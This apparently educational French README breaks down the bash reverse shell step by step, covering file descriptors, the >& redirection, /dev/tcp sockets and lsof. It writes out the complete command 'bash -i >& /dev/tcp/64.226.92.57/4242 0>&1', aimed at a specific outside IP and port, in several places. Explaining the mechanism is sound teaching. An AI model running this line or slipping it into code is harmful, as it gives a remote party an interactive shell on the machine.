# bash-reverse-shell

## `bash -i`

### File descriptors

[https://en.wikipedia.org/wiki/File_descriptor](https://en.wikipedia.org/wiki/File_descriptor)

> A file descriptor (FD, less frequently fildes) is a process-unique identifier (handle) for a file or other input/output resource, such as a pipe or network socket. 

![bash -i 01](./doc/bash_i_01.png?raw=true)

> Each Unix process (except perhaps daemons) should have three standard POSIX file descriptors, corresponding to the three standard streams: 0 (stdin), 1 (stdout), 2 (stderr).

* Le process bash `159936` a 3 file descriptors standards associés au terminal `0`.
* Le process bash `159992` a 3 file descriptors standards associés au terminal `1`.

### Ecriture dans un autre terminal

On peut écrire depuis un terminal vers un autre.

[https://unix.stackexchange.com/questions/93531/what-is-stored-in-dev-pts-files-and-can-we-open-them](https://unix.stackexchange.com/questions/93531/what-is-stored-in-dev-pts-files-and-can-we-open-them)

![bash -i 0](./doc/bash_i_0.png?raw=true)

### bash interactif

Lorsqu'on crée un bash interactif, il est associé au terminal de son process (bash) parent.

![bash -i 1](./doc/bash_i_1.png?raw=true)

[https://unix.stackexchange.com/questions/93531/what-is-stored-in-dev-pts-files-and-can-we-open-them](https://unix.stackexchange.com/questions/93531/what-is-stored-in-dev-pts-files-and-can-we-open-them)

## `bash -i >& /dev/tcp/64.226.92.57/4242`

### Redirection de stdout et stderr

[https://www.gnu.org/software/bash/manual/bash.html#Duplicating-File-Descriptors](https://www.gnu.org/software/bash/manual/bash.html#Duplicating-File-Descriptors)

En bash, l'opérateur `>&` redirige à la fois stdout et stderr sur la même destination.

Exemple :
```
root@my-next-app:~/work# pwd >& output.txt
root@my-next-app:~/work# cat output.txt
/root/work
root@my-next-app:~/work#
```

[https://www.reddit.com/r/linuxquestions/comments/kbdtqs/understanding_01_in_a_bash_reverse_shell/](https://www.reddit.com/r/linuxquestions/comments/kbdtqs/understanding_01_in_a_bash_reverse_shell/)

La commande `bash -i >& /dev/tcp/64.226.92.57/4242` :
* Crée une socket ("network file") vers 64.226.92.57, port 4242, en TCP
* Redirige stdout vers cette socket ("duplicate the resulting file to fd 1")
* Redirige stderr vers cette socket ("duplicate the resulting file to fd 2")

[https://www.scs.stanford.edu/07wi-cs244b/refs/net2.pdf](https://www.scs.stanford.edu/07wi-cs244b/refs/net2.pdf)

![bash -i + socket](./doc/bash_i_2.gif?raw=true)

### lsof

La commande `lsof -i -a -p <pid>` redonne les sockets (network files) utilisées par le pid

[https://unix.stackexchange.com/questions/235979/how-do-i-find-out-more-about-socket-files-in-proc-fd](https://unix.stackexchange.com/questions/235979/how-do-i-find-out-more-about-socket-files-in-proc-fd)

![lsof](./doc/lsof_1.gif?raw=true)

## `bash -i >& /dev/tcp/64.226.92.57/4242 0>&1`

La commande `bash -i >& /dev/tcp/64.226.92.57/4242 0>&1` :
* Crée une socket ("network file") vers 64.226.92.57, port 4242, en TCP
* Redirige stdout vers cette socket ("duplicates the resulting file to fd 1")
* Redirige stderr vers cette socket ("duplicates the resulting file to fd 2")
* "duplicates fd 1 to fd 0". Le file descriptor 0 (stdin) est la socket

![reverse shell](./doc/reverse_shell.gif?raw=true)